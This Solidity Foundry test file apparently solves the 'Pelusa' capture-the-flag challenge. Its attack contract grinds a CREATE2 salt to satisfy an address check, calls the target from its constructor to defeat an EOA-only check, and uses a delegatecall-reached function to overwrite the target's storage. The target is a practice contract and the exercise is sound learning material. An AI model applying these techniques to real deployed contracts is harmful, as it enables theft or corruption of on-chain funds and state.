// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";
import "forge-std/console.sol";

contract PelusaTest is Test {
    Pelusa pelusa;
    address public deployer;
    address public pelusaOwner;

    function setUp() public {
        deployer = makeAddr("deployer");
        vm.prank(deployer);
        pelusa = new Pelusa();
        //calculate owner address of pelusa contract
        pelusaOwner = address(uint160(uint256(keccak256(abi.encodePacked(deployer, blockhash(block.number))))));
	}

	function test() public {
        //we need to brute force contract address to pass: require(uint256(uint160(msg.sender)) % 100 == 10, "not allowed");
        for(uint256 i=0; i<1000; i++) {
            try new PellusaAttack{salt: bytes32(i)}(address(pelusa), pelusaOwner) returns(PellusaAttack pellusaAttack) {
                pelusa.shoot();
                break;
            } catch (bytes memory reason) {}
        }
        // GOAL of this CTF :D
        assertEq(pelusa.goals(), 2);
	}
}


contract PellusaAttack{
    address private immutable owner;
    address internal player;
    uint256 public goals = 1;
    address public ownerOfTarget;

    constructor(address _target, address _ownerOfTarget) {
        require(uint256(uint160(address(this))) % 100 == 10, "not allowed");
        //to pass isGoal()
        ownerOfTarget = _ownerOfTarget;
        //call should be done from constructor to pass require(msg.sender.code.length == 0, "Only EOA players");
        IPelusa(_target).passTheBall();
    }

    function getBallPossesion() external view returns(address){
        return ownerOfTarget;
    }

    function handOfGod() external returns(bytes32){
        //this function is called with delegatecall so we have access to pelusa storage. 
        // we increas goals to 2
        goals++;
        // this is needed to pass: require(uint256(bytes32(data)) == 22_06_1986);
        return bytes32(uint256(22_06_1986));
    }
}

interface IPelusa {
    function passTheBall() external;
}